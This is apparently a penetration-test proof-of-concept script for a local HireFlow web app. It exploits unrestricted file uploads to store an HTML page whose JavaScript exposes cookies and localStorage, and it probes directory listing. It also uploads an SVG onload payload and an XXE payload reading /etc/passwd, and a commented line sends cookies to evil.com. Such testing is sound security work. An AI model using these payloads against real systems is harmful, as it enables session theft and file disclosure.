#!/usr/bin/env python3
"""
WSTG-BUSL-08: Stored XSS via HTML File Upload

Vulnerability: The messaging attachment upload endpoint accepts ANY file type
(no file type filtering on the general 'upload' multer middleware). Uploaded
files are served from /uploads/ with their original extension, and the static
file server (express.static) serves .html files with text/html content-type.

Additionally, the /uploads/ directory has directory listing enabled via
serve-index middleware:
    app.use('/uploads', serveIndex(path.join(__dirname, '../uploads'), { icons: true }));

This means:
1. An attacker can upload an HTML file containing JavaScript via the messaging
   attachment endpoint.
2. The file is served at /uploads/<uuid>.html with text/html content-type.
3. Anyone visiting that URL executes the JavaScript (stored XSS).
4. The /uploads/ directory listing exposes all uploaded files to anyone.

Impact: Stored XSS. An attacker can steal session tokens, perform actions on
behalf of other users, or deliver phishing pages served from the legitimate domain.
"""

import requests
import sys
import io

BASE_URL = "http://localhost:3000"
CLIENT_ACCOUNTS = [
    {"email": "testclient@hireflow.com", "password": "password123"},
    {"email": "mark.stevens@techvault.io", "password": "password123"},
    {"email": "lisa.chen@brightpath.com", "password": "password123"},
]
FREELANCER_ACCOUNTS = [
    {"email": "testfreelancer@hireflow.com", "password": "password123"},
    {"email": "priya.sharma@gmail.com", "password": "password123"},
    {"email": "james.oconnor@outlook.com", "password": "password123"},
]


def try_login(accounts, role_label="user"):
    for creds in accounts:
        resp = requests.post(f"{BASE_URL}/api/auth/login", json=creds)
        if resp.status_code == 200:
            return resp.json()["token"], resp.json()["user"]
    print(f"    ERROR: No {role_label} account could be logged in.")
    sys.exit(1)


def main():
    print("=" * 70)
    print("WSTG-BUSL-08: Stored XSS via HTML File Upload + Directory Listing")
    print("=" * 70)

    # Step 1: Login
    print("\n[1] Logging in...")
    client_token, client_user = try_login(CLIENT_ACCOUNTS, "client")
    freelancer_token, freelancer_user = try_login(FREELANCER_ACCOUNTS, "freelancer")
    client_headers = {"Authorization": f"Bearer {client_token}"}
    freelancer_headers = {"Authorization": f"Bearer {freelancer_token}"}
    print(f"    Client: {client_user['email']}")

    # Step 2: Create or find a conversation to use for uploading
    print("\n[2] Finding/creating a conversation for file upload...")
    resp = requests.get(
        f"{BASE_URL}/api/messages/conversations",
        headers=client_headers
    )

    conversations = resp.json().get("conversations", []) if resp.status_code == 200 else []

    if conversations:
        conv_id = conversations[0]["id"]
        print(f"    Using existing conversation: {conv_id[:8]}...")
    else:
        print("    Creating a new conversation...")
        resp = requests.post(
            f"{BASE_URL}/api/messages/conversations",
            json={
                "participant_ids": [client_user["id"], freelancer_user["id"]],
                "subject": "File sharing test",
                "message": "Testing file upload"
            },
            headers=client_headers
        )
        if resp.status_code in (200, 201):
            conv_id = resp.json()["id"]
            print(f"    Created conversation: {conv_id[:8]}...")
        else:
            print(f"    Failed to create conversation: {resp.status_code}")
            sys.exit(1)

    # Step 3: Upload a malicious HTML file
    print("\n[3] Uploading malicious HTML file as messaging attachment...")

    malicious_html = """<!DOCTYPE html>
<html>
<head><title>XSS PoC</title></head>
<body>
<h1>Stored XSS Proof of Concept</h1>
<p>If you see an alert box, the XSS is confirmed.</p>
<script>
// This JavaScript executes in the context of the application's origin
document.write('<h2>XSS Executed!</h2>');
document.write('<p>Origin: ' + window.location.origin + '</p>');
document.write('<p>Cookies: ' + document.cookie + '</p>');
document.write('<p>localStorage keys: ' + Object.keys(localStorage).join(', ') + '</p>');

// In a real attack, this would exfiltrate data:
// fetch('https://evil.com/steal?cookies=' + encodeURIComponent(document.cookie));
</script>
</body>
</html>"""

    # Upload via messaging attachment endpoint
    files = {
        "attachments": ("xss-poc.html", io.BytesIO(malicious_html.encode()), "text/html")
    }
    data = {
        "content": "Check out this document"
    }

    resp = requests.post(
        f"{BASE_URL}/api/messages/conversations/{conv_id}/messages",
        files=files,
        data=data,
        headers=client_headers
    )

    print(f"    Upload status: {resp.status_code}")

    uploaded_url = None
    if resp.status_code in (200, 201):
        msg = resp.json()
        attachments = msg.get("attachments", [])
        if isinstance(attachments, str):
            import json
            try:
                attachments = json.loads(attachments)
            except:
                attachments = []

        if attachments:
            uploaded_path = attachments[0].get("path", "")
            uploaded_url = f"{BASE_URL}{uploaded_path}"
            print(f"    [UPLOADED] File accessible at: {uploaded_url}")
            print(f"    Filename: {attachments[0].get('filename', 'N/A')}")
            print(f"    MIME type: {attachments[0].get('mimetype', 'N/A')}")
        else:
            print(f"    Message sent but attachments field: {msg.get('attachments')}")
    else:
        print(f"    Response: {resp.text[:200]}")

    # Step 4: Verify the HTML file is served with text/html content type
    if uploaded_url:
        print(f"\n[4] Verifying HTML file is served with text/html Content-Type...")
        resp_html = requests.get(uploaded_url)
        content_type = resp_html.headers.get("Content-Type", "")
        print(f"    Status: {resp_html.status_code}")
        print(f"    Content-Type: {content_type}")

        if "text/html" in content_type:
            print(f"    [VULNERABLE] HTML file served as text/html!")
            print(f"    JavaScript in the file WILL execute in the browser.")
            print(f"    File content (first 200 chars): {resp_html.text[:200]}")
        else:
            print(f"    File served with Content-Type: {content_type}")

    # Step 5: Check directory listing
    print(f"\n[5] Checking directory listing at /uploads/...")
    resp_listing = requests.get(f"{BASE_URL}/uploads/")
    print(f"    Status: {resp_listing.status_code}")

    content_type = resp_listing.headers.get("Content-Type", "")
    if resp_listing.status_code == 200 and "html" in content_type:
        # Check if it's a directory listing
        body = resp_listing.text
        if "listing" in body.lower() or "<ul>" in body.lower() or "<table" in body.lower() or "href" in body.lower():
            print(f"    [VULNERABLE] Directory listing is enabled!")
            # Count files listed
            import re
            links = re.findall(r'href="([^"]+)"', body)
            file_links = [l for l in links if not l.startswith("?") and not l.startswith("/")]
            print(f"    Files visible: {len(file_links)}")
            for link in file_links[:5]:
                print(f"    - {link}")
            if len(file_links) > 5:
                print(f"    ... and {len(file_links) - 5} more")
        else:
            print(f"    Response seems to be HTML but may not be a listing")
    else:
        print(f"    Content-Type: {content_type}")

    # Step 6: Try uploading other dangerous file types
    print(f"\n[6] Testing other dangerous file types...")
    dangerous_files = [
        ("test.svg", '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><text>XSS</text></svg>', "image/svg+xml"),
        ("test.xml", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "application/xml"),
    ]

    for filename, content, mimetype in dangerous_files:
        files = {
            "attachments": (filename, io.BytesIO(content.encode()), mimetype)
        }
        resp = requests.post(
            f"{BASE_URL}/api/messages/conversations/{conv_id}/messages",
            files=files,
            data={"content": f"uploading {filename}"},
            headers=client_headers
        )
        if resp.status_code in (200, 201):
            msg = resp.json()
            attachments = msg.get("attachments", [])
            if isinstance(attachments, str):
                import json
                try:
                    attachments = json.loads(attachments)
                except:
                    attachments = []
            if attachments:
                print(f"    {filename}: UPLOADED at {attachments[0].get('path', 'N/A')}")
            else:
                print(f"    {filename}: uploaded but no attachment path")
        else:
            print(f"    {filename}: rejected (status {resp.status_code})")

    # Summary
    print("\n" + "=" * 70)
    print("RESULT: Stored XSS via file upload confirmed.")
    print("  - No file type restrictions on messaging attachments")
    print("  - HTML files served with text/html Content-Type")
    print("  - JavaScript executes in the application's origin context")
    print("  - Directory listing exposes all uploaded files")
    print("  - SVG files with event handlers also accepted")
    print("=" * 70)


if __name__ == "__main__":
    main()
